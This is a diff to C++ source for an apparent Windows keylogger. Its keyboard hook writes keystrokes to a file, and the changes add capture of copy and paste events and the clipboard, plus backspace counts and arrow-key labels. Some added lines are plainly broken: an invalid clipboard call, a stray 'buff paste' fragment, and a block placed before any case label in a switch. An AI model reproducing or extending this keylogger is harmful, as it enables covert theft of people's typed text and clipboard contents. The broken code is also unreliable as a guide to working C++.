@@ -82,6 +82,16 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             if (SHIFT_key) {
                 buf[count_char++] = c; //to upper
             }
+            else if (CTRL_key && key == 0x43) {//ctrl+c 
+                wchar_t str[] = L"COPY:\n";
+                wchar_t copy_str = Computer.Clipboard.GetText();
+                save_in_file(str);
+            }//copy here________________________
+            else if (CTRL_key && key == 0x56) {//ctrl+v
+                wchar_t str[] = L"PASTE:\n";
+                buff paste
+                save_in_file(str);
+            }//paste here________________________
             else buf[count_char++] = c + 0x20;//to lower
             uni_c = 0;
             if (back_space > 1) {
@@ -98,7 +108,7 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
                 back_space = 0;
             }
            
-        }
+        }//end a-z
 
         if (key >= 0x30 && key <= 0x39) {//encouter 1-9 is not numlock
             wchar_t c = L' ';
@@ -489,7 +499,8 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             }
         }
         //
-        else if (CTRL_key) {//encouter CTRL 
+        /*
+            else if (CTRL_key) {//encouter CTRL 
             wchar_t c[] = L" [CTRL] ";
             buf[++count_char] = '\0';
             count_char = 0;
@@ -497,6 +508,8 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             save_in_file(c);
             
         }
+        */
+
 
         else if (ALT_key) {//encouter ALT 
             wchar_t c[] = L" [ALT ]";
@@ -546,11 +559,24 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             
         }//end packet
         else if (key == VK_UP || key == VK_DOWN) {
+
         if (count_char > 0) {
             save_in_file(buf);
             count_char = 0;
             }
-       
+        if (back_space > 1) {
+            wstring space_num = to_wstring(back_space);
+
+
+            wchar_t str[50] = L"BACKSPACE X";
+            const  wchar_t* num = space_num.c_str();
+            wcscat_s(str, num);
+            wchar_t ab[] = L"\n";
+            wcscat_s(str, ab);
+            save_in_file(str);
+
+            back_space = 0;
+        }
         switch (key){
         case VK_UP: {
             wchar_t c[] = L"UP ARROW key\n ";
@@ -558,11 +584,12 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             break;
         }
         case VK_DOWN: {
-            wchar_t c[] = L"UP ARROW key\n ";
+            wchar_t c[] = L"DOWN ARROW key\n ";
             save_in_file(c);
             break;
         }
         }//end switch
+
 
            
          }//end if VK_UP
@@ -575,6 +602,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
         }
 
         switch (key) {
+            if (back_space > 1) {
+                wstring space_num = to_wstring(back_space);
+
+
+                wchar_t str[50] = L"BACKSPACE X";
+                const  wchar_t* num = space_num.c_str();
+                wcscat_s(str, num);
+                wchar_t ab[] = L"\n";
+                wcscat_s(str, ab);
+                save_in_file(str);
+
+                back_space = 0;
+            }
         case VK_LEFT: {
             wchar_t c[] = L"LEFT ARROW key\n ";
             save_in_file(c);
